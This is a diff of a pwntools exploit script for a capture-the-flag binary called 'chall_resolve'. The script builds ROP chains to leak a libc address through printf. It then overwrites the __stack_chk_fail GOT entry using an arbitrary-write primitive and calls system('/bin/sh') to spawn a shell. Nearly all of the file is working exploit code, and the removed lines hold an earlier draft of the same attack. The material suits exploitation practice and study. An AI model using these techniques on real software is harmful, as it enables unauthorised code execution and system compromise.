@@ -1,90 +1,68 @@
 from pwn import *
 
-bin_file = './chall_resolve'
-context(os = 'linux', arch = 'amd64')
+filename = './chall_resolve'
+chall = ELF(filename)
 
-binf = ELF(bin_file)
-addr_main = binf.functions['main'].address
-addr_got_fgets = binf.got['fgets']
-addr_got_scanf = binf.got['__isoc99_scanf']
-addr_got_printf = binf.got['printf']
-addr_got_stack_chk = binf.got['__stack_chk_fail']
+libcname = '/lib/x86_64-linux-gnu/libc.so.6'
+libc = ELF(libcname)
 
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-offset_libc_fgets = libc.functions['fgets'].address
+# conn = remote('localhost', 9001)
+# conn = process(filename)
+conn = gdb.debug(filename, '''
+b *0x401230''')
 
-# def aar(conn, read_addr):
-#     conn.sendlineafter(b'>> ', b'1')
-#     conn.sendlineafter(b'read >> ', hex(read_addr))
-#     conn.recvuntil(b' : ')
-#     res = int(conn.recvuntil(b'\n'), 16)
-#     return res
+main_addr = chall.functions['main'].address
+stack_chk_fail_got = chall.got['__stack_chk_fail']
+printf_got = chall.got['printf']
+printf_plt = chall.plt['printf']
+fgets_plt = chall.plt['fgets']
+printf_libc = libc.functions['printf'].address
+system_libc = libc.functions['system'].address
+shell_str = next(libc.search(b'/bin/sh'))
+aaw_addr = 0x00000000004011a1
 
-# def aaw(conn, written_addr, write_addr):
-#     conn.sendlineafter(b'>> ', b'2')
-#     conn.sendlineafter(b'write >> ', hex(written_addr))
-#     conn.sendlineafter(b'value >> ', hex(write_addr))
+# ROP gadgets
+## 0x00000000004012a3: pop rdi; ret;
+pop_rdi = 0x00000000004012a3
+## 0x00000000004012a2: pop r15; ret;
+pop_ret = 0x00000000004012a2
+## 0x00000000004012a0: pop r14; pop r15; ret;
+pop_pop_ret = 0x00000000004012a0
+## 0x000000000040129e: pop r13; pop r14; pop r15; ret;
+pop_pop_pop_ret = 0x000000000040129e
 
-def attack(conn):
-    rop = ROP(binf)
-    print(rop.ret)
-    # round 1
-    
-    # buf1 = 
-    conn.sendlineafter(b'>> ', buf1)
 
-    # __stack_chk_fail() to ROP
-    buf2 = addr_got_stack_chk
-    conn.sendlineafter(b'>> ', hex(buf2))
-    
-    buf3 = addr_main
-    conn.sendlineafter(b'>> ', hex(buf3))
+def AAW(dst, data):
+    buf = str(hex(dst)).encode()
+    conn.sendlineafter(b'Input address >> ', buf)
 
-    # # # round 2
-    # buf4 = b'/bin/sh\x00'.ljust(28, b'\x00')
-    # conn.sendlineafter(b'>> ', buf4)
+    buf = str(hex(data)).encode()
+    conn.sendlineafter(b'Input value   >> ', buf)
 
-    # # scanf() to printf()
-    # buf5 = addr_got_scanf
-    # print(hex(addr_got_scanf))
-    # conn.sendlineafter(b'>> ', hex(buf5))
 
-    # buf6 = addr_got_printf
-    # conn.sendlineafter(b'>> ', hex(buf6))
+# Input msg
+buf1 = p64(pop_rdi)
+buf1 += p64(printf_got)
+buf1 += p64(printf_plt)
+buf1 += p64(aaw_addr)
 
-    # # round 3
-    # buf7 = b'/bin/sh\x00'.ljust(28, b'\x00')
-    # conn.sendlineafter(b'>> ', buf7)
+conn.sendlineafter(b'Input message >> ', buf1)
 
-    # # fgets() to system()
-    # buf8 = addr_got_scanf
-    # conn.sendlineafter(b'>> ', hex(buf5))
+# Ignite ROP Chain
+AAW(stack_chk_fail_got, pop_pop_pop_ret)
 
-    # buf9 = addr_got_printf
-    # conn.sendlineafter(b'>> ', hex(buf6))
-    
-    # libc.address = addr_libc_fgets - offset_libc_fgets
-    # info('addr_libc_base_addr = 0x{:08x}'.format(libc.address))    
-    # addr_libc_system = libc.functions['system'].address
-    # buf6 = addr_libc_system
-    
-    # libc.address = addr_libc_fgets - offset_libc_fgets
-    # info('addr_libc_base_addr = 0x{:08x}'.format(libc.address))    
-    # addr_libc_system = libc.functions['system'].address
-    
-    # aaw(conn, addr_got_exit, addr_main)    
-    # addr_libc_atoi = aar(conn, addr_got_atoi)
-    # libc.address = addr_libc_atoi - offset_libc_atoi
-    # info('addr_libc_baseaddr = 0x{:08x}'.format(libc.address))
-    # addr_libc_system = libc.functions['system'].address
-    # aaw(conn, addr_got_atoi, addr_libc_system)
-    # conn.sendline('/bin/sh')
+# Leak libc address
+printf_leak = u64(conn.recv(6)+b'\x00\x00')
+libc_base = printf_leak - printf_libc
+info('printf_leak = 0x{:08x}'.format(printf_leak))
 
-def main():
-    conn = process(bin_file)
-    attack(conn)
-    conn.interactive()
+buf2 = b'b'*0x28
+buf2 += p64(pop_rdi)
+buf2 += p64(shell_str)
+buf2 += p64(system_libc+libc_base)
+# buf2 += b'b'*0x20
+conn.sendlineafter(b'Input message >> ', buf2)
 
-if __name__ == '__main__':
-    main()
+AAW(stack_chk_fail_got, pop_ret)
 
+conn.interactive()
